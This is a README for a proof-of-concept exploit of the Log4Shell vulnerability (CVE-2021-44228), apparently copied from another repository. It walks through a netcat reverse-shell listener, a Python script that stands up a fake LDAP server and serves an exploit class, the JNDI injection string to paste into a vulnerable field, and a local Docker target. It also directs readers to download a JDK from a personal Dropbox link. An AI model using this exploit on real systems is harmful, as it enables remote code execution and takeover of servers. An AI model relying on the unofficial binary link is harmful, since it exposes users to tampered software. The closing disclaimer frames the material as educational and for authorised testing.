# log4j-shell-poc

Cribbed from the great https://github.com/kozmer/log4j-shell-poc !!  


A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>

#### Usage :

You need 4 terminals, and 3 terminals and a web browser!  
They are as follows:  

1) attacker terminal 1 of 3 (wow!): reverse shell cc reciever
2) attacker terminal 2 of 3: ldap listener enabler man in the middle jumper
3) attacker terminal 3 of 3: just a terminal to do a curl or use a web browser
4) victim terminal 1 of 1: run java app as docker container

Step 1) In terminal 1, Start  netcat to accept reverse shell connection:  
```py
nc -lvnp 9001
```

Step 2) In terminal 2, Launch the ldap listener jumper:  
**Note:** Must download jdk-8u202-linux-x64.tar.gz and extract to jdk1.8.0_202  
I have saved it to my personal dropbox here www dot dropbox dot com/   s/7c1d5y6naqcrdyh/jdk-8u202-linux-x64.tar.gz?dl=0  
Now run it like this:

```bash
pip install -r requirements.txt
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```
This script will setup the HTTP server (not sure what the http is for, but whatevs) and the LDAP server for you, and it will also create the payload that you can use to paste into the vulnerable parameter. After this, if everything went well, you should get a shell on the lport.  

Step 3) Our vulnerable application  
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

Getting the Java version.
--------------------------------------

At the time of creating the exploit we were unsure of exactly which versions of java work and which don't so chose to work with one of the earliest versions of java 8: `java-8u20`.

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.


Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this awesome vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).

Our team will not aid, or endorse any use of this exploit for malicious activity, thus if you ask for help you may be required to provide us with proof that you either own the target service or you have permissions to pentest on it.

